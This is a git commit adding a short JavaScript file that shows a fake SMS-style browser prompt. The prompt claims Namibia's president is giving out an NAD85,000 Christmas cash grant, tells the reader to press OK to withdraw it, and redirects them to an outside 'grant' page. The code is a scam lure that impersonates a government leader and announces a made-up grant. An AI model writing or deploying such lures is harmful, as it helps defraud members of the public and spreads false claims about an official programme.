dc61e785eaacc3a9a5ac1195d86099053f9ce286
boss-bloq <nsisboy01@gmail.com>
2024-12-06 23:02:35 -0800

    Create namibia-active.js

---
+++ namibia-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW NAD85,000'
+password=prompt('SMS: Congratulations You are qualify for President NETUMBO NANDI-NDAITWAH NAD85,000 CHRISTMAS CASH GRANT FOR NAMIBIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW NAD85,000');
+if (password != 'WITHDRAW NAD85,000') {
+location.href='https://damba-fest.org/namibia-grant.html';
+}
